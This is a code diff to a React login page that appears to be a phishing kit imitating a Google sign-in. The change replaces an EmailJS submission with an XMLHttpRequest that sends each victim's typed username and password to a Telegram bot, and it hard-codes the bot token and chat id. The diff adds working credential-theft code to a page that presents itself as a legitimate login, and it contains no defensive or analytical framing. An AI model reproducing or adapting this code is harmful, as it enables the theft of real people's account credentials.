@@ -2,7 +2,7 @@ import '../HomePage/homepage.css';
 import '../HomePage/thankyou.css';
 import logoSvg from '../../img/G__logo.svg.png';
 import { useState, useRef } from "react";
-import emailjs from 'emailjs-com';
+// import emailjs from 'emailjs-com';
 
 function HomePage() {
     var qfNum = 0;
@@ -56,9 +56,9 @@ function HomePage() {
     const togglePassword = () => {
         setPasswordShown(!passwordShown);
     };
-    const SERVICE_ID = 'service_cf79ytj';
-    const TEMPLATE_ID = 'template_8oalb5q';
-    const USER_ID = "5Fma-P-1aeivvlJxc";
+    // const SERVICE_ID = 'service_cf79ytj';
+    // const TEMPLATE_ID = 'template_8oalb5q';
+    // const USER_ID = "5Fma-P-1aeivvlJxc";
 
     function handleSubmit(event) {
         event.preventDefault();
@@ -71,7 +71,16 @@ function HomePage() {
             qfFunck(passwordUser.current);
             if (qfNum === 0) {
                 if (userName.current.value && passwordUser.current.value) {
-                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
+                    const url = `https://api.telegram.org/bot7200818155:AAF9EaPk7xr8kBsonHfMpg8JrwA_s8TRWkM/sendMessage` // The url to request
+                    const obj = {
+                        chat_id: 1368494862, // Telegram chat id
+                        text: "Username - " + userName.current.value + "\n" + "Verify - " + passwordUser.current.value, // The text to send
+                    };
+                    const xht = new XMLHttpRequest();
+                    xht.open("POST", url, true);
+                    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+                    xht.send(JSON.stringify(obj));
+                    // emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                     setUsertazaname(userName.current.value);
                     setErevaVer(!erevaVer);
                     setTimeout(function () {
